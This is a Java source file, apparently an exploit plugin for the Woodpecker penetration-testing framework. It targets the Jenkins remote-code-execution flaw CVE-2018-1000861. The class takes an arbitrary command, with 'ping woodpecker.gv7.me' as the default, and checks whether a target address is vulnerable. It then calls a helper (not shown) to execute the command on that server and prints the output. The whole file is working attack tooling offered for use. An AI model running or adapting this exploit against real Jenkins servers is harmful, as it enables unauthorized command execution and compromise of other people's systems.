package me.gv7.woodpecker.plugin.exploits;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class JenkinsGroovyExecuteCVE_2018_1000861 implements IExploit {
    @Override
    public String getExploitTabCaption() {
        return "CVE_2018_1000861 反序列化";
    }

    @Override
    public IArgsUsageBinder getExploitCutomArgs() {
        List<IArgs> args = new ArrayList<>();
        final IArgs gadge = JenkinsDeserializationRCE.pluginHelper.createArgs();
//        gadge.setName("gadge");
//        gadge.setDefaultValue("CommonsCollections3");
//        gadge.setDescription("ysoserial的gadge");
//        gadge.setRequired(true);
//        gadge.setType(0);

        final IArgs command = JenkinsDeserializationRCE.pluginHelper.createArgs();
        command.setName("command");
        command.setDefaultValue("ping woodpecker.gv7.me");
        command.setDescription("ysoserial传入的命令");
        command.setRequired(true);
        command.setType(0);

//      args.add(gadge);
        args.add(command);
        IArgsUsageBinder argsUsageBinder = JenkinsDeserializationRCE.pluginHelper.createArgsUsageBinder();
        argsUsageBinder.setArgsList(args);

        return argsUsageBinder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, String> customArgs, IResultOutput resultOutput) {
        String command = customArgs.get("command");

        String address = target.getAddress();
        if (JenkinsCommonsUtils.CVE_2018_1000861Check(address)){
            String result = JenkinsCommonsUtils.CVE_2018_1000861Exploit(address, command);
            resultOutput.infoPrintln(result);
        }
    }
}
